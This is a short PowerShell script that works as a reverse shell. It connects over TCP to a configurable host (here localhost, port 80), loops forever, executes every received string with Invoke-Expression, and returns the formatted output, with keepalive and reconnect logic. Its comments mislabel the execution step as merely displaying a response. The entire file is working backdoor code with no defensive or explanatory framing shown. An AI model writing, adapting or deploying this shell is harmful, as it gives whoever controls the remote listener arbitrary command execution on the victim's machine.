# Define the IP address and port to connect to
$remoteIP = "localhost"
$remotePort = 80


while ($true) {
    # Create a TCP client to connect to the remote host
    $client = New-Object System.Net.Sockets.TcpClient($remoteIP, $remotePort)

    # Get the stream to write outgoing data to the remote host
    $stream = $client.GetStream()

    # Create a StreamWriter object to write data to the stream
    $writer = New-Object System.IO.StreamWriter($stream)

    $secondsWithoutCommand = 0

    while ($true) {

        while ($stream.DataAvailable) {
            # Wait for a response from the remote host
            $buffer = New-Object byte[] 1024
            $bytesRead = $stream.Read($buffer, 0, 1024)
            $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
        
            # Display the response from the remote host
            $output = Invoke-Expression $command

            # Format the output for display
            $formattedOutput = $output | Format-Table -AutoSize | Out-String

            # Send the command to the remote host
            $writer.WriteLine($formattedOutput)
            $writer.Flush()

            $secondsWithoutCommand = 0
        }

        if ($secondsWithoutCommand -ge 5) {
            # Attempt to send a message to the client to check if it's still connected
            try {
                $writer.WriteLine(" ")
                $writer.Flush()
            }
            catch [System.IO.IOException] {
                # The message failed to send, indicating that the client is no longer connected
                break
            }
        } 

        # Save processing
        Start-Sleep(1)
        $secondsWithoutCommand += 1
    }

    # Close the connection to the remote host
    $client.Close()

}